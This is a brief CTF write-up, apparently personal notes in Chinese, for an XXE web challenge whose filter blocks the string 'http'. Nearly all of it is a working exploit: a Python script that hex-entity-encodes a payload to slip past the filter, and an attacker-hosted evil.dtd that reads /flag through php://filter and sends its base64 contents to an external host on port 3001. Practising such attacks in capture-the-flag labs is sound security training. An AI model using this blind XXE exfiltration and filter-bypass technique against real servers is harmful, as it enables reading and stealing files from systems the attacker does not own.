tags:: CTFWEB/XXE

- # 思路
	- XXE,题目过滤了`http`
	- 使用编码绕过
- # Payload
	- ```python
	  url = "http://bf5c4c6a-f49f-446e-95f6-877823a0c621.challenge.ctf.show/"
	  
	  def encode_xml(s):
	      ans = ""
	      for c in s:
	          ans +="&#x{};".format(hex(ord(c))[2:])
	      return ans
	  
	  evil = """
	      <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
	      <!ENTITY % dtd SYSTEM 'http://ca.xxx.xyz:3001/evil.dtd'>
	  
	  """
	  
	  payload = """\
	  <!DOCTYPE updateProfile [
	      <!ENTITY % uguess "{}">
	      %uguess;
	      %dtd;
	      %send;
	  ]>
	  """.format(
	      encode_xml(evil)
	  )
	  
	  r = base_post(url, data = payload)
	  
	  print(r.text)
	  ```
	- 服务器
		- ```
		  root@VM-a1YYrO2dEe63:~/test# cat evil.dtd
		  <!ENTITY % all
		      "<!ENTITY &#x25; send SYSTEM 'http://ca.xxx.xyz:3001/?data=%file;'>"
		  >
		  %all;
		  ```
-